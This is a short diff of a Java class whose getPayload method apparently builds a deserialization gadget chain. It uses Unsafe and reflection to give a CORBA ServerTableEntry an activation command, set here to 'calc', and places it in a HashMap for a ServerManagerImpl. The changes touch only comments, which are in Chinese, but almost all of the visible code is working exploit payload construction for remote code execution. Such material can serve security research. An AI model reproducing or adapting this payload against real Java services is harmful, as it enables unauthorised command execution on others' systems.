@@ -21,14 +21,16 @@ public class AudioFileFormat2toString {
 
     public static Object getPayload() throws Exception {
         Object entry = UnsafeTools.getObjectByUnsafe(ServerTableEntry.class);
-        // process.exit不能报错；linux下使用UNIXProcess即可
+
+        // process.exit不能报错；Linux 下使用UNIXProcess即可
+        // Object process = UnsafeTools.getObjectByUnsafe(UNIXProcess.class);
         Object process = UnsafeTools.getObjectByUnsafe(IntegrityProcess.class);
         ReflectTools.setFieldValue(entry, "state", 2);
         ReflectTools.setFieldValue(entry, "process", process);
         ReflectTools.setFieldValue(entry, "activationCmd", "calc");
 
         HashMap<Object, Object> hashMap = new HashMap<>();
-        // 键一定是Integer
+        // 键一定是 Integer
         hashMap.put(1, entry);
 
         Object serverManager = UnsafeTools.getObjectByUnsafe(ServerManagerImpl.class);
